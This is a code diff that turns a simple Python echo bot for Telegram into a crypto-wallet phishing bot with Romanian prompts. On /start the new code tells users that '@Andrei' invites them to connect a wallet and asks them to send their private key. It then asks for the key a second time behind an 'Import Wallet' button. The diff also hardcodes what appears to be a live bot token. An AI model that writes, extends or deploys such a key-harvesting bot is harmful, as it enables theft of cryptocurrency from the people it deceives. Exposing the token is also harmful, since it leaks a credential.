@@ -1,17 +1,26 @@
-from telegram import Update
-from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
+import telebot
+from telebot import types
 
-# Pune aici tokenul de la BotFather
-TOKEN = "AICI_TOKENUL_TAU"
+TOKEN = '7987838254:AAG9sMRcYekjzHHCmklfIQnyoIoxwNwwew0'
+bot = telebot.TeleBot(TOKEN)
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-await update.message.reply_text("Salut! Acesta este botul meu.")
+@bot.message_handler(commands=['start'])
+def start_message(message):
+bot.send_message(
+message.chat.id,
+f"@Andrei te invită să-ți conectezi portofelul.\n\nTrimite private key:"
+)
+bot.register_next_step_handler(message, get_key)
 
-async def echo(update: Update, context: ContextTypes.DEFAULT_TYPE):
-await update.message.reply_text(update.message.text)
+def get_key(message):
+bot.send_message(message.chat.id, "Mulțumim! Sistemul nostru este descentralizat.")
+markup = types.InlineKeyboardMarkup()
+btn = types.InlineKeyboardButton("Import Wallet", callback_data="import_wallet")
+markup.add(btn)
+bot.send_message(message.chat.id, "Apasă pe Import Wallet:", reply_markup=markup)
 
-app = ApplicationBuilder().token(TOKEN).build()
-app.add_handler(CommandHandler("start", start))
-app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, echo))
+@bot.callback_query_handler(func=lambda call: call.data == "import_wallet")
+def handle_import(call):
+bot.send_message(call.message.chat.id, "Please enter your private key to import your wallet:")
 
-app.run_polling()
+bot.polling()
